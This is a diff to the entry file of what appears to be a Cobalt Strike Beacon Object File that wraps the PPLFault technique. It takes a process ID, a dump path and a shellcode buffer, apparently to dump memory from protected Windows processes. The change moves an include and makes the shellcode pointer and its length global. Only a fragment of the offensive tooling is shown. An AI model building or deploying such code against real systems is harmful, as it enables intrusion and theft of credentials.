@@ -1,12 +1,14 @@
 #include <phnt_windows.h>
 #include "beacon.h"
 #include "bofdefs.h"
+#include "base.c"
 #include "PayloadUtils.cpp"
 #include "MemoryCommand.cpp"
 #include "payload.cpp"
 #include "PPLFault.cpp"
-#include "base.c"
 
+extern uint8_t* shellcode;
+extern DWORD shellcodelen;
 
 //Need PID, dmptarget and shellcode buffer
 VOID go(
@@ -23,7 +25,7 @@ VOID go(
 	BeaconDataParse(&parser, Buffer, Length);
 	DWORD pid = BeaconDataInt(&parser);
 	wchar_t* outputpath = (wchar_t*)BeaconDataExtract(&parser, NULL);
-	uint8_t* shellcode = (uint8_t*)BeaconDataExtract(&parser, NULL);
+	shellcode = (uint8_t*)BeaconDataExtract(&parser, (int*) & shellcodelen);
 
 
 	if (!bofstart())
